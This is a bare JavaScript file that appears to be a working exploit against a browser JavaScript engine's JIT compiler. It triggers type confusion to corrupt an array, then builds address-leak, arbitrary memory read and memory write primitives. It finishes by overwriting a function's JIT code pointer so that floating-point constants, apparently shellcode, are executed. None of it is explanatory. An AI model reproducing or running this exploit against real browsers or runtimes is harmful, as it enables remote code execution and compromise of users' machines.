let length = 10000;
var padding = 40;

var arr = new Array(length);
arr.fill(0);
function func() {
  return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 2.6348604765229606e-284];
}
for (let i = 0; i < 5000; i++) func(0);

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);
var bigIntView = new BigInt64Array(view);

function ftoi32(f) {
    dblArr[0] = f;
    return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
    intView[0] = i1;
    intView[1] = i2;
    return dblArr[0];
}

function itof(i) {
    bigIntView = BigInt(i);
    return dblArr[0];
}

function ftoi(f) {
    dblArr[0] = f;
    return bigIntView[0];
}

var corrupted_arr = [1.1];
var oobDblArr = [2.2];
var oobObjArr = [view];
oobObjArr[0] = 1;

var corrupted = {a : corrupted_arr};
var obj0 = {px : {x : 1}};
var str0 = 'aaa';
var str1 = 'bbb';
var str3 = 'ccc';
var str4 = 'ddd';

function tc(x) {
  var obj = x.p1.px;
  obj.x = 100;
  return x.p1.px.x;
}

function foo2(obj, proto, x,y) {
  obj.obj = proto;
  var z = 0;
  for (let i = 0; i < 1; i++) {
    for (let j = 0; j < x; j++) {
      for (let k = 0; k < x; k++) {
        z = y[k];
      }
    }

  }
  proto.b = 33;
  return z;
}

class B {}
B.prototype.a = 1;
B.prototype.a = 2;
B.prototype.b = 1;

function bar(x) {
  return x instanceof B;
}
var args = {obj: B.prototype};
foo2(args, B.prototype, 20, arr);
for (let i = 0; i < 5000; i++) {
  foo2(args, B.prototype, 10, arr);
}
bar({a : 1});
for (let i = 0; i < 5000; i++) {
  bar({b : 1});
}
foo2(args, B.prototype, length, arr);
var z = B.prototype;
var arr3 = new Array(padding);
arr3.fill(1);
var obj1 = {p0 : str0, p1 : obj0, p2 : 0};
for (let i = 0; i < 20000; i++) {
  tc(obj1);
}

Object.defineProperty(z, 'aaa', {value : corrupted, writable : true});

tc(obj1);

var oobOffset = 4;

function addrof(obj) {
  oobObjArr[0] = obj;
  var addrDbl = corrupted_arr[13];
  return ftoi32(addrDbl)[1];
}

function read(addr) {
  var old_value = corrupted_arr[oobOffset];
  corrupted_arr[oobOffset] = i32tof(addr,2);
  var oldAddr = ftoi32(old_value);
  var out = ftoi32(oobDblArr[0]);
  corrupted_arr[oobOffset] = old_value;
  return out;
}

function write(addr, val1, val2) {
  var old_value = corrupted_arr[oobOffset];
  corrupted_arr[oobOffset] = i32tof(addr,2);
  oobDblArr[0] = i32tof(val1, val2);
  corrupted_arr[oobOffset] = old_value;
  return;
}

var funcAddr = addrof(func);
console.log("func address: " + funcAddr.toString(16));
var code = read(funcAddr + 0x10)[0];

var jitAddr = read(code + 0x8);
console.log("jit code address: " + jitAddr[0].toString(16), jitAddr[1].toString(16));
if (funcAddr == 0x7ff80000) {
  console.log("exploit failed, please retry");
}
write(code + 0x8, jitAddr[0] + 0x54 + 2, jitAddr[1]);
func();
